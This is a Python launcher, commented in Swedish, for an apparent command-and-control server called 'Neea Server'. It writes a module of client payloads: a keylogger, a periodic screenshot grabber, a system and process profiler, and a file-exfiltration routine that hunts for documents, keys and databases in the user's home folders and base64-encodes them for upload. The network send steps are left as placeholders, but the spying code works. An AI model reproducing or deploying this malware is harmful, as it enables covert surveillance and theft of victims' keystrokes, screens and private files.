
#!/usr/bin/python
import subprocess
import sys
import os
import shutil
import logging
import time

def setup_environment():
    """Säkerställer att nödvändiga kataloger finns."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    base_dir = os.path.dirname(os.path.dirname(script_dir))
    
    # Skapa nödvändiga kataloger
    data_dir = os.path.join(base_dir, "data", "logs")
    clients_dir = os.path.join(data_dir, "clients")
    static_dir = os.path.join(base_dir, "static")
    templates_dir = os.path.join(base_dir, "templates")
    config_dir = os.path.join(base_dir, "config")
    
    for directory in [data_dir, clients_dir, static_dir, templates_dir, config_dir]:
        os.makedirs(directory, exist_ok=True)
        print(f"Säkerställt att katalogen finns: {directory}")
    
    return True

def check_dependencies():
    """Kontrollerar att nödvändiga Python-paket är installerade."""
    required_packages = ["flask", "flask_cors"]
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("Saknade beroenden upptäckta. Försöker installera...")
        try:
            for package in missing_packages:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print("Alla beroenden har installerats.")
        except Exception as e:
            print(f"Fel vid installation av beroenden: {e}")
            return False
    
    return True

def check_instruction_file():
    """Säkerställer att instructions.py finns och innehåller nödvändig kod."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    instruction_file = os.path.join(script_dir, "instructions.py")
    
    if not os.path.exists(instruction_file):
        print("Skapar instructions.py...")
        with open(instruction_file, "w", encoding="utf-8") as f:
            f.write("""# Instructions for clients

INSTRUCTIONS = {
    "standard": \"\"\"
import os
import platform
import socket
import uuid
import json
import time
import datetime

def get_system_info():
    system_data = {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
    }
    return system_data

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    return mac

def get_public_ip():
    try:
        import urllib.request
        response = urllib.request.urlopen('https://api.ipify.org')
        return response.read().decode('utf-8')
    except:
        return "Unknown"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def report():
    system_info = get_system_info()
    
    # Generera ett unikt klient-id baserat på maskinnamn och MAC-adress
    client_id = f"{socket.gethostname()}-{get_mac_address().replace(':', '')}"
    
    data = {
        "id": client_id,
        "name": system_info["hostname"],
        "os": f"{system_info['system']} {system_info['release']}",
        "username": system_info["username"],
        "system": system_info["system"],
        "public_ip": get_public_ip(),
        "private_ip": get_private_ip(),
        "instruction": "standard",
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    return data

# Standard operation is just periodic reporting
while True:
    try:
        report_data = report()
        print(f"Reporting standard system information: {report_data}")
        # Here would be code to send the data to the server
        time.sleep(60)  # Report every minute
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(300)  # Wait longer if there's an error
\"\"\",

    "keylogger": \"\"\"
import os
import platform
import socket
import uuid
import json
import time
import datetime

# Keylogger specific imports
try:
    from pynput import keyboard
except ImportError:
    print("Installing pynput...")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    from pynput import keyboard

def get_system_info():
    system_data = {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
    }
    return system_data

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    return mac

def get_public_ip():
    try:
        import urllib.request
        response = urllib.request.urlopen('https://api.ipify.org')
        return response.read().decode('utf-8')
    except:
        return "Unknown"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def report():
    system_info = get_system_info()
    
    # Generera ett unikt klient-id baserat på maskinnamn och MAC-adress
    client_id = f"{socket.gethostname()}-{get_mac_address().replace(':', '')}"
    
    data = {
        "id": client_id,
        "name": system_info["hostname"],
        "os": f"{system_info['system']} {system_info['release']}",
        "username": system_info["username"],
        "system": system_info["system"],
        "public_ip": get_public_ip(),
        "private_ip": get_private_ip(),
        "instruction": "keylogger",
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    return data

# Keylogger functionality
keystrokes = []
max_keys = 100  # Maximum keys to collect before reporting

def on_press(key):
    try:
        keystrokes.append(str(key.char))
    except AttributeError:
        keystrokes.append(str(key))
    
    if len(keystrokes) >= max_keys:
        report_keystrokes()

def report_keystrokes():
    if keystrokes:
        keylog_data = ''.join(keystrokes)
        print(f"Captured keystrokes: {keylog_data}")
        keystrokes.clear()
        # Here would be code to send the keylog data to the server

# Start the keylogger
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Report system information and periodic status
while True:
    try:
        report_data = report()
        print(f"Reporting keylogger status: {report_data}")
        # Here would be code to send the data to the server
        time.sleep(300)  # Report every 5 minutes
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(300)  # Wait if there's an error
\"\"\",

    "screenshot": \"\"\"
import os
import platform
import socket
import uuid
import json
import time
import datetime
import base64

# Screenshot specific imports
try:
    from PIL import ImageGrab
    import io
except ImportError:
    print("Installing required packages...")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow"])
    from PIL import ImageGrab
    import io

def get_system_info():
    system_data = {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
    }
    return system_data

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    return mac

def get_public_ip():
    try:
        import urllib.request
        response = urllib.request.urlopen('https://api.ipify.org')
        return response.read().decode('utf-8')
    except:
        return "Unknown"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def report():
    system_info = get_system_info()
    
    # Generera ett unikt klient-id baserat på maskinnamn och MAC-adress
    client_id = f"{socket.gethostname()}-{get_mac_address().replace(':', '')}"
    
    data = {
        "id": client_id,
        "name": system_info["hostname"],
        "os": f"{system_info['system']} {system_info['release']}",
        "username": system_info["username"],
        "system": system_info["system"],
        "public_ip": get_public_ip(),
        "private_ip": get_private_ip(),
        "instruction": "screenshot",
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    return data

def take_screenshot():
    try:
        # Take a screenshot
        screenshot = ImageGrab.grab()
        
        # Convert to JPEG and encode as base64
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG", quality=30)
        screenshot_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        print(f"Screenshot captured, size: {len(screenshot_base64)} bytes")
        return screenshot_base64
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

# Report system information and take periodic screenshots
while True:
    try:
        report_data = report()
        print(f"Reporting screenshot status: {report_data}")
        
        # Take and report a screenshot
        screenshot_data = take_screenshot()
        if screenshot_data:
            print("Screenshot captured successfully")
            # Here would be code to send the screenshot to the server
        
        time.sleep(300)  # Take a screenshot every 5 minutes
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(300)  # Wait if there's an error
\"\"\",

    "system_info": \"\"\"
import os
import platform
import socket
import uuid
import json
import time
import datetime
import psutil

# Ensure psutil is installed
try:
    import psutil
except ImportError:
    print("Installing psutil...")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
    import psutil

def get_system_info():
    system_data = {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "python_version": platform.python_version(),
        "architecture": platform.architecture(),
    }
    return system_data

def get_hardware_info():
    try:
        cpu_count = psutil.cpu_count(logical=False)
        cpu_count_logical = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        if cpu_freq:
            cpu_freq = f"{cpu_freq.current:.2f}MHz"
        else:
            cpu_freq = "Unknown"
            
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        hardware_data = {
            "cpu_physical_cores": cpu_count,
            "cpu_logical_cores": cpu_count_logical,
            "cpu_frequency": cpu_freq,
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_total": f"{memory.total / (1024**3):.2f}GB",
            "memory_available": f"{memory.available / (1024**3):.2f}GB",
            "memory_percent_used": memory.percent,
            "disk_total": f"{disk.total / (1024**3):.2f}GB",
            "disk_used": f"{disk.used / (1024**3):.2f}GB",
            "disk_free": f"{disk.free / (1024**3):.2f}GB",
            "disk_percent_used": disk.percent,
            "battery": get_battery_info()
        }
        
        return hardware_data
    except Exception as e:
        print(f"Error getting hardware info: {e}")
        return {"error": str(e)}

def get_battery_info():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return {
                "percent": battery.percent,
                "power_plugged": battery.power_plugged,
                "time_left": str(datetime.timedelta(seconds=battery.secsleft)) if battery.secsleft > 0 else "Unknown"
            }
        return "No battery detected"
    except:
        return "Could not retrieve battery information"

def get_network_info():
    try:
        network_data = {
            "interfaces": {},
            "connections": len(psutil.net_connections())
        }
        
        for interface, addresses in psutil.net_if_addrs().items():
            network_data["interfaces"][interface] = []
            for address in addresses:
                addr_data = {
                    "address": address.address,
                    "netmask": address.netmask,
                    "family": str(address.family)
                }
                network_data["interfaces"][interface].append(addr_data)
        
        return network_data
    except Exception as e:
        print(f"Error getting network info: {e}")
        return {"error": str(e)}

def get_process_info():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        # Sort by CPU usage and get top 10
        top_processes = sorted(processes, key=lambda p: p.get('cpu_percent', 0), reverse=True)[:10]
        return top_processes
    except Exception as e:
        print(f"Error getting process info: {e}")
        return {"error": str(e)}

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    return mac

def get_public_ip():
    try:
        import urllib.request
        response = urllib.request.urlopen('https://api.ipify.org')
        return response.read().decode('utf-8')
    except:
        return "Unknown"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def report():
    system_info = get_system_info()
    hardware_info = get_hardware_info()
    network_info = get_network_info()
    process_info = get_process_info()
    
    # Generera ett unikt klient-id baserat på maskinnamn och MAC-adress
    client_id = f"{socket.gethostname()}-{get_mac_address().replace(':', '')}"
    
    data = {
        "id": client_id,
        "name": system_info["hostname"],
        "os": f"{system_info['system']} {system_info['release']}",
        "username": system_info["username"],
        "system": system_info["system"],
        "public_ip": get_public_ip(),
        "private_ip": get_private_ip(),
        "instruction": "system_info",
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "detailed_system": system_info,
        "hardware": hardware_info,
        "network": network_info,
        "processes": process_info
    }
    
    return data

# Report detailed system information periodically
while True:
    try:
        report_data = report()
        print(f"Reporting detailed system information")
        print(json.dumps(report_data, indent=2))
        # Here would be code to send the data to the server
        time.sleep(600)  # Report every 10 minutes
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(300)  # Wait if there's an error
\"\"\",

    "file_exfiltration": \"\"\"
import os
import platform
import socket
import uuid
import json
import time
import datetime
import base64

def get_system_info():
    system_data = {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
    }
    return system_data

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    return mac

def get_public_ip():
    try:
        import urllib.request
        response = urllib.request.urlopen('https://api.ipify.org')
        return response.read().decode('utf-8')
    except:
        return "Unknown"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def report():
    system_info = get_system_info()
    
    # Generera ett unikt klient-id baserat på maskinnamn och MAC-adress
    client_id = f"{socket.gethostname()}-{get_mac_address().replace(':', '')}"
    
    data = {
        "id": client_id,
        "name": system_info["hostname"],
        "os": f"{system_info['system']} {system_info['release']}",
        "username": system_info["username"],
        "system": system_info["system"],
        "public_ip": get_public_ip(),
        "private_ip": get_private_ip(),
        "instruction": "file_exfiltration",
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    return data

def find_interesting_files():
    """Find potentially interesting files on the system."""
    interesting_files = []
    
    # Define locations to search
    home_dir = os.path.expanduser("~")
    search_locations = [
        os.path.join(home_dir, "Documents"),
        os.path.join(home_dir, "Desktop"),
        os.path.join(home_dir, "Downloads")
    ]
    
    # File types to look for
    interesting_extensions = [
        ".doc", ".docx", ".pdf", ".txt", ".xls", ".xlsx", ".ppt", ".pptx",
        ".csv", ".jpg", ".png", ".key", ".json", ".xml", ".html", ".py",
        ".sql", ".db", ".sqlite", ".config", ".ini", ".log"
    ]
    
    # Size limit (10MB)
    size_limit = 10 * 1024 * 1024
    
    for location in search_locations:
        if os.path.exists(location) and os.path.isdir(location):
            for root, dirs, files in os.walk(location):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in interesting_extensions):
                        full_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(full_path)
                            if file_size < size_limit:
                                interesting_files.append({
                                    "path": full_path,
                                    "size": file_size,
                                    "last_modified": datetime.datetime.fromtimestamp(os.path.getmtime(full_path)).strftime('%Y-%m-%d %H:%M:%S')
                                })
                        except:
                            pass
                            
                # Limit the number of files to prevent excessive data
                if len(interesting_files) >= 50:
                    break
    
    return interesting_files[:50]  # Return max 50 files

def exfiltrate_file(file_path):
    """Read a file and encode it as base64."""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
            encoded_data = base64.b64encode(file_data).decode('utf-8')
            
            return {
                "path": file_path,
                "filename": os.path.basename(file_path),
                "size": len(file_data),
                "data": encoded_data
            }
    except Exception as e:
        print(f"Error reading file {file_path}: {e}")
        return None

# Report system information and periodically exfiltrate files
exfiltrated_files = set()  # Keep track of which files have been sent

while True:
    try:
        report_data = report()
        print(f"Reporting file exfiltration status")
        
        # Find interesting files
        files = find_interesting_files()
        print(f"Found {len(files)} interesting files")
        
        # Exfiltrate one new file each cycle
        for file_info in files:
            file_path = file_info["path"]
            if file_path not in exfiltrated_files:
                print(f"Exfiltrating file: {file_path}")
                file_data = exfiltrate_file(file_path)
                
                if file_data:
                    # Here would be code to send the file data to the server
                    print(f"File exfiltrated successfully: {file_path}")
                    exfiltrated_files.add(file_path)
                    break  # Only exfiltrate one file per cycle
        
        time.sleep(600)  # Wait 10 minutes between cycles
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(300)  # Wait if there's an error
\"\"\"
}
""")
        print("instructions.py skapad")
        return True
    
    print("instructions.py finns redan")
    return True

def main():
    """
    Startar server.py med korrekt Python-miljö och beroenden.
    """
    print("Startar Neea Server...")
    
    # Säkerställ att miljö och beroenden är klara
    if not setup_environment():
        print("Kunde inte säkerställa servermiljön")
        return 1
    
    if not check_dependencies():
        print("Kunde inte säkerställa nödvändiga beroenden")
        return 1
    
    if not check_instruction_file():
        print("Kunde inte säkerställa instructions.py")
        return 1
    
    # Kör server.py med Python
    script_dir = os.path.dirname(os.path.abspath(__file__))
    server_file = os.path.join(script_dir, "server.py")
    
    try:
        print("Startar server...")
        subprocess.run([sys.executable, server_file])
    except Exception as e:
        print(f"Fel vid start av server: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
